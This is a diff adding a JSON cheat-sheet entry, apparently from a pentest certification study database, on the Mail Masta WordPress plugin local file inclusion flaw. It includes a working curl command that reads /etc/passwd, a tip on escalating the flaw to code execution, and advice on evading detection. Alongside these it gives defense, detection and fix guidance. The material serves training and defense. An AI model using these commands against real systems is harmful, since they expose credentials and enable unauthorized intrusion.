@@ -1,0 +1,86 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "curl"
+  ],
+  "tags": [
+    "wordpress",
+    "lfi",
+    "cve"
+  ],
+  "category": "Exploitation",
+  "subcategory": "WordPress",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Read /etc/passwd through the Mail Masta LFI parameter",
+      "command": "curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+    }
+  ],
+  "notes": "Classic unauthenticated LFI - no login needed, so it's a good first probe once the plugin is confirmed. Chain it with log poisoning or php://filter to turn file-read into code exec.",
+  "references": [
+    {
+      "title": "Mail Masta LFI (Exploit-DB)",
+      "url": "https://www.exploit-db.com/exploits/40290"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "wp-detect",
+      "note": "Confirms the vulnerable plugin is installed.",
+      "rel": "prereq"
+    },
+    {
+      "id": "wp-wpdiscuz-rce",
+      "note": "Another vulnerable-plugin path on the same target.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "wp-mailmasta-lfi",
+  "name": "WordPress - Mail Masta Plugin LFI",
+  "command": "curl -s http://<url>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd",
+  "description": "The vulnerable Mail Masta plugin includes a user-controlled path, allowing local file inclusion to read arbitrary files such as /etc/passwd.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "The Mail Masta plugin (1.0) passes a user-supplied path directly to include() without sanitization. An attacker provides a path traversal sequence to include local files such as /etc/passwd or wp-config.php.",
+    "prerequisites": "Mail Masta plugin installed and activated. No open_basedir restriction. PHP include() with no path validation.",
+    "impact": "Read arbitrary local files: wp-config.php (database credentials), /etc/passwd, SSH keys — leading to credential theft and potential RCE.",
+    "detection": "GET requests to the plugin endpoint containing directory traversal sequences (../). WAF alert for LFI patterns. PHP error logs if path not found.",
+    "artifacts": "Web server access logs (GET with ../../etc/passwd in parameter) | WAF alerts for path traversal | PHP error log entries",
+    "prevention": "Update or remove Mail Masta. Set open_basedir = /var/www/html in php.ini. Never pass user-controlled values to include()/require(). Use an allowlist for file paths.",
+    "misconfiguration": "Mail Masta plugin passes $_GET['pl'] directly to include() with no sanitization. No open_basedir restriction allows traversal outside the web root.",
+    "vulnerable_config": "// Vulnerable Mail Masta code\n$paginate = $_GET['pl'];\ninclude($paginate);  // direct user input\n\n// php.ini -- no restriction\n; open_basedir =",
+    "secure_config": "# php.ini\nopen_basedir = /var/www/html\n\n# Allowlist pattern\n$allowed = ['page1', 'page2'];\nif (in_array($_GET['pl'], $allowed)) {\n  include('/var/www/html/pages/' . $_GET['pl'] . '.php');\n}",
+    "evasion": "URL-encode traversal (%2e%2e%2f). Use PHP filter wrapper (php://filter/read=convert.base64-encode/resource=) to avoid execution alerts.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1083",
+      "OWASP A05:2021"
+    ]
+  }
+}
